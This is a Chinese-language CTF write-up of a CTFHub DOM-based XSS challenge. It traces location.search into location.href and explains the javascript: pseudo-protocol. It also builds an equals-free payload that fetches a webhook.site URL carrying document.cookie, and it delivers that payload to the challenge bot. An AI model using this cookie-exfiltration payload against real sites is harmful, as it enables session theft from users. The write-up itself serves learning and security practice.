---
layout: writeup
tags: [ctfhub]

title: "CTFHub CTF Writeup - DOM跳转"
date: 2026-10-28

skill: "web-xss/DOM跳转"
completed: true
---

# CTFHub Writeup - DOM跳转

## 题目类型

Web

## 题目描述

XSS DOM JumpTo ?
JumpTo
Hello, CTFHub
Send URL to Bot
URL


## 解题过程

<br>1. 设置目标地址 $BASE="http://challenge-315abb070e6cbcec.sandbox.ctfhub.com:10800"，用 curl.exe -si "$BASE/" 访问根路径，直接返回 HTTP/1.1 200 OK，没有 302 跳转，也不存在 text 参数。
<br>2. 用 curl.exe -s "$BASE/" \| Select-String -Pattern 'jumpto\|location\|form' -Context 2,2 抽取页面中相关片段，发现页面里只有一个 disabled 的表单，真正逻辑在脚本中：var target = location.search.split("="); if (target\[0\].slice(1) == "jumpto") \{ location.href = target\[1\]; \}。据此判定 source 为 location.search、sink 为 location.href，触发条件为 query 以 ?jumpto= 开头，属于纯客户端逻辑的 DOM-based XSS。
<br>3. 确认 javascript: 伪协议可执行：location.href 被赋值为 javascript:... 时浏览器会在当前文档上下文执行这段 JS，因此可读取 document.cookie；并记录最小 PoC 为 http://\<target\>/?jumpto=javascript:alert(document.domain)，同时注明 curl 看不到弹窗、需在浏览器地址栏验证。
<br>4. 分析 split("=") 带来的约束：query 被按 = 全部切开后只取 target\[1\]，任何多余的 = 都会截断 payload。用 PowerShell 对 $q = '?jumpto=javascript:fetch("https://webhook.site/xxx/?c="+document.cookie)' 执行 $q -split '=' 复现，输出为 \[0\] ?jumpto、\[1\] javascript:fetch("https://webhook.site/xxx/?c、\[2\] "+document.cookie)，说明只有第一段会传给 location.href，因此改用把 cookie 拼进 URL path 的思路，且整段 JS 不含 =。
<br>5. 通过 curl.exe -s -X POST "https://webhook.site/token" -H "Content-Type: application/json" -d "\{\}" 创建接收端，返回 uuid 6eb04604-97ec-4ba4-a146-0922914ad81f，接收地址为 https://webhook.site/6eb04604-97ec-4ba4-a146-0922914ad81f，命中记录通过 https://webhook.site/token/\<uuid\>/requests?sorting=newest 读取。
<br>6. 用反引号模板字符串构造无 = 的 payload：javascript:fetch(\`https://webhook.site/\<uuid\>/$\{encodeURIComponent(document.cookie)\}\`)，并用 PowerShell 拼接完整 URL 后统计等号数量，结果为 len=183、eq-count=1，确认只有 ?jumpto= 这一处等号。
<br>7. 把 URL 组装成 \{"url":"..."\} 写入 body2.json，用 curl.exe -X POST "$BASE/submit" -H "Content-Type: application/json" --data-binary "@body2.json" 投递给 bot，服务端返回 \{"code": 0, "msg": "Successfully"\} 与 http 200。
<br>8. 提交后 Start-Sleep -Seconds 10 等待，再请求 https://webhook.site/token/6eb04604-97ec-4ba4-a146-0922914ad81f/requests?sorting=newest 查看命中记录以获取回传内容。

## 疑问与解答

### 1.

<br>问题：DOM-based XSS 与反射型、存储型 XSS 的区别在哪里？
<br>解答：反射型和存储型 XSS 的关键在于服务端把不可信数据拼进返回的 HTML，浏览器解析 HTML 时执行脚本；DOM-based XSS 则全程发生在客户端，服务端返回的 HTML 可能完全不变，是页面自身的 JavaScript 把可控输入（source，如 location.search）不加校验地传给危险操作（sink，如 location.href、innerHTML）。因此这类漏洞靠抓包只看服务端响应往往看不出来，需要审计前端脚本中的 source 到 sink 数据流。

### 2.

<br>问题：为什么 location.href = "javascript:..." 能够在页面里执行代码？
<br>解答：javascript: 是一种伪协议，浏览器把这类 URI 交给 JavaScript 引擎在当前文档的上下文中求值，而不是发起网络请求。由于求值上下文就是靶场页面本身，脚本可以访问该页面的 document.cookie、DOM 与同源接口，所以既能弹窗验证，也能把 cookie 外带到外部接收端。需要注意的是这种执行发生在浏览器中，用 curl 这类纯 HTTP 客户端只能看到页面源码，观察不到脚本执行结果。

### 3.

<br>问题：为什么 payload 里不能出现等号，又如何绕过？
<br>解答：location.search.split("=") 会把整条 query 按每个 = 切开，代码只取 target\[1\]，即第一个 = 与第二个 = 之间的片段，多出来的 = 会让后面的内容被丢到 target\[2\] 之后而无法进入 sink。绕过思路是在保持语义的前提下避免使用 =：赋值改用带参函数调用、把待传数据放进 URL 的 path 而不是 query 参数，并用模板字符串与 encodeURIComponent 把 cookie 中的 =、\{、\}、; 等字符编码进路径，从而既满足约束又能完整回传。


## 本题的核心逻辑：

<br>题属于典型的 DOM 型 XSS：前端脚本从 location.search 读取 query，按 = 切分后判断首段是否为 jumpto，是则把第二段直接赋给 location.href 完成跳转。source 完全由 URL 控制，sink 是导航赋值，中间没有任何白名单校验或协议过滤，因此传入 javascript: 伪协议即可让代码在页面上下文中执行，进而读取 document.cookie。

<br>于后端不参与这段逻辑，漏洞的验证与利用必须借助真实浏览器：题目提供的 Send URL to Bot 让 bot 以访客身份打开给定链接，而 payload 需要把读取到的 cookie 送出靶场。为此引入外部接收端（webhook.site）承载回传请求，再通过其 token 接口查询命中记录。整个利用链的关键约束来自 split("=")：一旦 payload 中含额外等号就会被截断，因此必须使用不含 = 的写法并把数据编码进 URL 路径。


## 笔记

这道题主要学习了：

<br>1. DOM 型漏洞的排查要点是先在前端代码中定位 source 与 sink：source 是用户可控的输入入口（location.search、location.hash、referrer 等），sink 是能引发执行或渲染的危险操作（location.href、eval、innerHTML 等）。定位到数据流后，再分析两者之间存在哪些字符级或结构级约束，这些约束往往决定 payload 的最终形态。
<br>2. 利用链路上要区分验证与回传两件事：先在浏览器中确认 javascript: 伪协议可执行的最小 PoC，再用外部接收端承载数据外带，并用无等号、无空格的写法适配 split("=") 截断，最后借助题目的 bot 以受害者身份访问链接，通过接收端的请求列表接口取回结果。
